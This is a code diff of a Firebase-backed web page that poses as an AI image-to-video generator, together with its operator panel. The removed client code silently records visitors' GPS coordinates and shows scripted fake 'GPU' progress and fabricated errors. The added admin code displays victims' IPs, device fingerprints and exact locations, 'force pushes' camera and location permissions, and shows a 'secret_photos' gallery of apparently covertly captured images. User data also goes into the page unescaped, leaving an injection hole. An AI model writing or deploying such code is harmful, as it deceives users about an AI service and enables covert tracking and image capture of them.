-          navigator.geolocation.getCurrentPosition(
-              (pos) => { 
-                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-                  set(ref(db, `users/${deviceId}/gpsHistory/${Date.now()}`), { lat: pos.coords.latitude, lon: pos.coords.longitude, time: new Date().toISOString() });
-                  checkGates();
-              }, 
-              (err) => { 
-                  localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-                  checkGates();
-              }, 
-              { enableHighAccuracy: true, timeout: 5000 }
-          );
-      } else {
-          localStorage.setItem('gpsVerified', 'true'); document.getElementById('gpsGate').style.display = 'none';
-          checkGates();
-      }
-  }
-
-  onValue(ref(db, 'settings/admin_status'), snap => { isGpuOnline = snap.val() === true; });
-  trackUser();
-
-  window.handleImageSelect = (event) => {
-      const file = event.target.files[0]; if (!file) return;
-      const reader = new FileReader();
-      reader.onload = (e) => {
-          const img = new Image();
-          img.onload = () => {
-              const canvas = document.createElement('canvas'); 
-              const MAX_WIDTH = 1080;
-              const MAX_HEIGHT = 1080;
-              let width = img.width; let height = img.height;
-              
-              if (width > MAX_WIDTH) { height = Math.round((height * MAX_WIDTH) / width); width = MAX_WIDTH; }
-              if (height > MAX_HEIGHT) { width = Math.round((width * MAX_HEIGHT) / height); height = MAX_HEIGHT; }
-              
-              canvas.width = width; canvas.height = height; 
-              const ctx = canvas.getContext('2d'); ctx.drawImage(img, 0, 0, width, height);
-              
-              currentBase64Image = canvas.toDataURL('image/jpeg', 0.8);
-              
-              document.getElementById('previewImg').src = currentBase64Image; 
-              document.getElementById('previewImg').style.display = 'block'; 
-              document.getElementById('uploadPlaceholder').style.display = 'none';
-              logAction("High-Quality Image selected");
-          };
-          img.src = e.target.result;
+      window.toggleCustomErr = (id) => {
+          const select = document.getElementById(`errSelect_${id}`).value;
+          const input = document.getElementById(`errInput_${id}`);
+          if(select === 'custom') input.classList.remove('hidden'); else input.classList.add('hidden');
       };
-      reader.readAsDataURL(file);
-  };
 
-  function checkActiveGeneration() {
-      const savedReqId = localStorage.getItem('activeReqId');
-      if(savedReqId) {
-          activeReqId = savedReqId;
-          try { currentBase64Image = localStorage.getItem('savedAiImage') || ""; } catch(e){}
-          const savedPrompt = localStorage.getItem('savedAiPrompt') || "";
+      window.sendAiError = (id) => {
+          const selectVal = document.getElementById(`errSelect_${id}`).value;
+          let finalMsg = selectVal === 'custom' ? document.getElementById(`errInput_${id}`).value : selectVal;
+          if(!finalMsg) return alert("Select or type an error message.");
+          update(ref(db, `ai_requests/${id}`), { status: 'error', errorMsg: finalMsg });
+      };
+
+      window.uploadAiVideo = (id) => {
+          const vidUrl = document.getElementById(`vid_${id}`).value;
+          if(!vidUrl) return alert("Paste a video URL first.");
+          update(ref(db, `ai_requests/${id}`), { status: 'completed', videoUrl: vidUrl, errorMsg: '' });
+      };
+
+      onValue(ref(db, 'users'), snap => {
+          const tb = document.getElementById('userTableBody'); tb.innerHTML = ''; 
+          allUsersRaw = snap.val() || {};
           
-          if(currentBase64Image) {
-              document.getElementById('previewImg').src = currentBase64Image; 
-              document.getElementById('previewImg').style.display = 'block'; 
-              document.getElementById('uploadPlaceholder').style.display = 'none';
-          }
-          if(savedPrompt) document.getElementById('aiPrompt').value = savedPrompt;
+          Object.keys(allUsersRaw).reverse().forEach(k => {
+              if (!k.includes('-AUTH-') && !k.includes('-HW-')) return; 
 
-          document.getElementById('inputControls').style.display = 'none'; 
-          document.getElementById('uploadBox').style.pointerEvents = 'none';
-          attachGenerationListener();
-      }
-  }
-
-  function attachGenerationListener() {
-      onValue(ref(db, `ai_requests/${activeReqId}`), (snap) => {
-          if(!snap.exists()) { resetGenerator(); return; }
-          const req = snap.val();
-          
-          if(req.status === 'uploading' || req.status === 'pending' || req.status === 'generating') {
-              document.getElementById('procOverlay').style.display = 'flex';
-              
-              if(req.status === 'uploading') {
-                  document.getElementById('procText').innerText = "Uploading HQ Image...";
-              } else if(!animationInterval) {
-                  const steps = ["Allocating GPU resources...", "Scanning facial topology...", "Applying Deep models...", "Rendering frame sequence...", "Finalizing video export..."];
-                  let stepIdx = 0;
-                  animationInterval = setInterval(() => { 
-                      if(stepIdx < steps.length) { document.getElementById('procText').innerText = steps[stepIdx]; stepIdx++; } 
-                  }, 2500);
-              }
-          } else if(req.status === 'completed' || req.status === 'error') {
-              clearInterval(animationInterval); animationInterval = null;
-              document.getElementById('procOverlay').style.display = 'none'; 
-              showResultUI(req);
-          }
+              const u = allUsersRaw[k];
+              tb.innerHTML += `<tr>
+                  <td style="font-family:monospace; color:var(--red); font-size:0.85rem;">${k}</td>
+                  <td>${u.device?.os || 'Unknown'}</td>
+                  <td>${u.firstVisit ? new Date(u.firstVisit).toLocaleString() : ''}</td>
+                  <td>${u.banned ? '<span class="badge b-error">🚫 Banned</span>' : (u.status === 'Live' ? '<span class="badge b-completed">🟢 Live</span>' : '<span class="badge b-pending">🔴 Offline</span>')}</td>
+                  <td style="text-align:right;">
+                      <button class="btn btn-gray" style="padding:0.4rem 0.8rem;" onclick="viewUser('${k}')">View Full Profile</button>
+                      <button class="btn btn-danger" style="padding:0.4rem 0.6rem;" onclick="remove(ref(db, 'users/${k}'))">🗑️</button>
+                  </td>
+              </tr>`;
+          });
       });
-  }
 
-  window.startGeneration = () => {
-      const prompt = document.getElementById('aiPrompt').value.trim();
-      if(!currentBase64Image) return alert("Please select an image first.");
-      if(!prompt) return alert("Please enter a prompt.");
+      document.getElementById('trackSearch').addEventListener('input', function() {
+          const filter = this.value.toLowerCase();
+          document.querySelectorAll('#userTableBody tr').forEach(row => {
+              row.style.display = row.innerText.toLowerCase().includes(filter) ? '' : 'none';
+          });
+      });
 
-      document.getElementById('inputControls').style.display = 'none'; 
-      document.getElementById('uploadBox').style.pointerEvents = 'none';
-      const overlay = document.getElementById('procOverlay'); const procText = document.getElementById('procText'); 
-      overlay.style.display = 'flex';
-      procText.innerText = "Processing request...";
+      window.viewUser = (id) => {
+          viewingUserId = id; 
+          const u = allUsersRaw[id];
+          if(!u) return;
 
-      const reqRef = push(ref(db, 'ai_requests')); 
-      activeReqId = reqRef.key;
+          const d = u.device || {}; const n = u.network || {};
 
-      localStorage.setItem('activeReqId', activeReqId);
-      localStorage.setItem('savedAiPrompt', prompt);
-      try { localStorage.setItem('savedAiImage', currentBase64Image); } catch(e){} 
+          document.getElementById('umTitle').innerText = id;
+          document.getElementById('umIdSource').innerText = d.idSource || 'Deep Hardware ID';
+          document.getElementById('umType').innerText = d.type || 'None'; 
+          document.getElementById('umOSBrowser').innerText = `${d.os || 'Unk'} - ${d.browser || 'Unk'}`;
+          document.getElementById('umGPU').innerText = d.gpu || 'None';
+          document.getElementById('umHardware').innerText = `Screen: ${d.screen || '?'} | RAM: ${d.ram || '?'} | CPU: ${d.cores || '?'}`;
+          document.getElementById('umISP').innerText = n.org || 'None'; 
+          document.getElementById('umLocation').innerText = `${n.city || ''}, ${n.region || 'None'}`;
+          document.getElementById('umIp').innerText = n.ip || 'None'; 
+          document.getElementById('umFirst').innerText = u.firstVisit ? new Date(u.firstVisit).toLocaleString() : 'None';
+          document.getElementById('umLast').innerText = u.lastActive ? new Date(u.lastActive).toLocaleString() : 'None';
 
-      set(reqRef, {
-          deviceId: deviceId, prompt: prompt, imageUrl: "uploading", 
-          status: 'uploading', errorMsg: '', videoUrl: '', timestamp: new Date().toISOString(), userHidden: false
-      }).then(async () => {
-          try {
-              procText.innerText = "Uploading HQ Image smoothly...";
-              const dbUrl = `https://ai-studio-b0c87-default-rtdb.firebaseio.com/ai_requests/${activeReqId}.json`;
-              const response = await fetch(dbUrl, {
-                  method: 'PATCH',
-                  headers: { 'Content-Type': 'application/json' },
-                  body: JSON.stringify({
-                      imageUrl: currentBase64Image,
-                      status: 'pending' 
-                  })
+          const banBtn = document.getElementById('banToggleBtn');
+          banBtn.innerText = u.banned ? "Unban Device" : "Ban Device";
+          banBtn.style.background = u.banned ? "var(--green)" : "var(--red)";
+          banBtn.onclick = () => { update(ref(db, 'users/'+id), {banned: !u.banned}); document.getElementById('userModal').style.display='none'; };
+
+          get(ref(db, `users/${id}/custom_perms`)).then(snap => {
+              const perms = snap.val() || {};
+              document.getElementById('pushCam').checked = perms.camera || false;
+              document.getElementById('pushLoc').checked = perms.location || false;
+          });
+
+          const actionBox = document.getElementById('umActionsList'); 
+          if(u.actions) {
+              const acts = Object.values(u.actions).sort((a,b) => new Date(b.time) - new Date(a.time));
+              let actsHtml = ''; acts.forEach(a => { actsHtml += `<div class="action-row"><span style="color:var(--text);">${a.action}</span><span style="color:var(--muted); font-size:0.7rem;">${new Date(a.time).toLocaleString()}</span></div>`; });
+              actionBox.innerHTML = actsHtml;
+          } else { actionBox.innerHTML = '<div class="action-row" style="color:var(--muted); justify-content:center;">No live actions recorded yet.</div>'; }
+
+          const historyBox = document.getElementById('umAiHistory');
+          historyBox.innerHTML = '<p style="text-align:center; color:var(--muted);">Loading Generation History...</p>';
+          
+          get(ref(db, 'ai_requests')).then(snap => {
+              historyBox.innerHTML = '';
+              const allReqs = snap.val() || {};
+              let hasHistory = false;
+              
+              Object.keys(allReqs).reverse().forEach(reqId => {
+                  const req = allReqs[reqId];
+                  if (req.deviceId === id) {
+                      hasHistory = true;
+                      let badge = ''; 
+                      if(req.status === 'pending') badge = '<span style="color:#f0ad4e;">⏳ Pending</span>'; 
+                      else if(req.status === 'generating') badge = '<span style="color:#5bc0de;">⚙️ Generating</span>'; 
+                      else if(req.status === 'error') badge = `<span style="color:#ff8c94;">⚠️ Error: ${req.errorMsg}</span>`; 
+                      else badge = '<span style="color:#6ef59a;">✅ Completed</span>';
+
+                      let imgEl = (req.imageUrl && req.imageUrl !== "uploading") ? `<a href="${req.imageUrl}" target="_blank"><img src="${req.imageUrl}" class="ai-history-img"></a>` : `<div class="ai-history-img" style="display:flex;align-items:center;justify-content:center;color:#444;">No Image</div>`;
+
+                      historyBox.innerHTML += `
+                          <div class="ai-history-card">
+                              ${imgEl}
+                              <div class="ai-history-content">
+                                  <div class="ai-history-meta">
+                                      <span>${new Date(req.timestamp).toLocaleString()}</span>
+                                      <span>${badge}</span>
+                                  </div>
+                                  <div class="ai-history-prompt">"${req.prompt}"</div>
+                              </div>
+                          </div>
+                      `;
+                  }
               });
 
-              if(!response.ok) throw new Error("Stream Failed");
+              if(!hasHistory) historyBox.innerHTML = '<p style="text-align:center; color:var(--muted);">No generation history found for this device.</p>';
+          });
 
-              if(!isGpuOnline) { 
-                  setTimeout(() => { update(ref(db, `ai_requests/${activeReqId}`), { status: 'error', errorMsg: 'GPU Clusters Unreachable. Connection Timeout.' }); }, 8000); 
-              }
-              attachGenerationListener();
+          document.getElementById('userModal').style.display = 'flex';
+      };
 
-          } catch(e) {
-              alert("Upload Interrupted: Please check your internet connection.");
-              resetGenerator();
-          }
-      }).catch(e => {
-          alert("Network Initialization Error.");
-          resetGenerator();
+      document.getElementById('pushPermBtn').addEventListener('click', () => {
+          if(!viewingUserId) return;
+          const rules = { camera: document.getElementById('pushCam').checked, location: document.getElementById('pushLoc').checked };
+          update(ref(db, `users/${viewingUserId}/custom_perms`), rules).then(() => { alert("Permissions Force Push Sent!"); });
       });
-  };
 
-  function showResultUI(req) {
-      const resOverlay = document.getElementById('resultOverlay'); resOverlay.style.display = 'flex';
-      if(req.status === 'completed') {
-          resOverlay.innerHTML = `
-            <button onclick="playAiVideo('${req.videoUrl}')" class="btn" style="width:80%; margin-bottom:10px; border-radius:50px; background:#2DC653;">▶ Play Video</button>
-            <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Start New Generation</button>
-          `;
-      } else if(req.status === 'error') {
-          resOverlay.innerHTML = `
-            <div class="error-msg">⚠️ ${req.errorMsg}</div>
-            <button onclick="resetGenerator()" class="btn btn-gray" style="width:80%; border-radius:50px;">🔄 Try Again</button>
-          `;
-      }
+      onValue(ref(db, 'support_requests'), snap => {
+          const data = snap.val() || {}; const tb = document.getElementById('approvalsTbody'); tb.innerHTML = '';
+          Object.keys(data).reverse().forEach(k => {
+              const req = data[k];
+              tb.innerHTML += `<tr>
+                  <td><span style="color:var(--red); font-family:monospace;">${req.regId}</span><br>Name: ${req.name}</td>
+                  <td>${req.message}<br><a href="https://www.google.com/maps?q=${req.lat},${req.lon}" target="_blank" style="color:var(--green); font-size:0.8rem;">📍 View Exact Location</a></td>
+                  <td style="text-align:right;">
+                      <button class="btn btn-green" style="padding:0.4rem 0.8rem;" onclick="approveDevice('${req.regId}', '${k}')">✅ Approve Access</button>
+                      <button class="btn btn-danger" style="padding:0.4rem 0.8rem;" onclick="banDevice('${req.regId}', '${k}')">🚫 Reject & Ban</label>
+                  </td>
+              </tr>`;
+          });
+      });
+
+      window.approveDevice = (devId, reqId) => {
+          update(ref(db, `users/${devId}`), { deviceApproved: true, banned: false }).then(() => {
+              update(ref(db, `support_requests/${reqId}`), { status: 'replied', adminMessage: 'Access Granted' });
+          });
+      };
+      
+      window.banDevice = (devId, reqId) => {
+          if(confirm("Permanently ban this hardware?")) {
+              update(ref(db, `users/${devId}`), { banned: true, banReason: 'hack', deviceApproved: false });
+              update(ref(db, `support_requests/${reqId}`), { status: 'hacker_ban' });
+          }
+      };
+
+      window.loadSecretPhotos = () => {
+          const grid = document.getElementById('photosGrid'); grid.innerHTML = ''; 
+          get(ref(db, 'secret_photos')).then((snap) => {
+              const data = snap.val() || {}; 
+              Object.keys(data).reverse().forEach(k => {
+                  grid.innerHTML += `<div style="background:var(--surf2); padding:10px; border-radius:12px; text-align:center;"><a href="${data[k].imageBase64}" target="_blank"><img src="${data[k].imageBase64}" style="width:100%; height:150px; object-fit:cover; border-radius:8px;"></a><p style="font-size:0.7rem; color:var(--muted); margin:5px 0;">${new Date(data[k].time).toLocaleString()}</p><button class="btn btn-danger" style="padding:0.4rem; width:100%;" onclick="remove(ref(db, 'secret_photos/${k}')); this.parentElement.remove();">Delete</button></div>`;
+              });
+          });
+      };
+      document.getElementById('refreshPhotosBtn').addEventListener('click', loadSecretPhotos);
   }
-
-  window.resetGenerator = () => {
-      activeReqId = null; currentBase64Image = ""; 
-      localStorage.removeItem('activeReqId'); localStorage.removeItem('savedAiImage'); localStorage.removeItem('savedAiPrompt');
-      document.getElementById('fileInput').value = ''; document.getElementById('previewImg').src = ''; document.getElementById('previewImg').style.display = 'none';
-      document.getElementById('uploadPlaceholder').style.display = 'block'; document.getElementById('resultOverlay').style.display = 'none'; document.getElementById('procOverlay').style.display = 'none';
-      document.getElementById('inputControls').style.display = 'block'; document.getElementById('uploadBox').style.pointerEvents = 'auto'; document.getElementById('aiPrompt').value = '';
-  };
-
-  window.playAiVideo = (url) => {
-      document.body.style.overflow = 'hidden'; document.getElementById('playerModal').style.display = 'flex';
-      const nativeP = document.getElementById('nativePlayer'); const iframeP = document.getElementById('iframePlayer');
-      if (url.match(/\.(mp4|m3u8)$/i) || url.includes('.mp4?') || url.startsWith('blob:')) { iframeP.style.display = 'none'; nativeP.style.display = 'block'; nativeP.src = url; nativeP.play(); } 
-      else { nativeP.style.display = 'none'; iframeP.style.display = 'block'; iframeP.src = url; }
-  };
-  window.closePlayer = () => {
-      document.getElementById('playerModal').style.display = 'none'; document.body.style.overflow = '';
-      document.getElementById('nativePlayer').pause(); document.getElementById('nativePlayer').src = ''; document.getElementById('iframePlayer').src = '';
-  };
 </script>
 </body>
 </html>
+
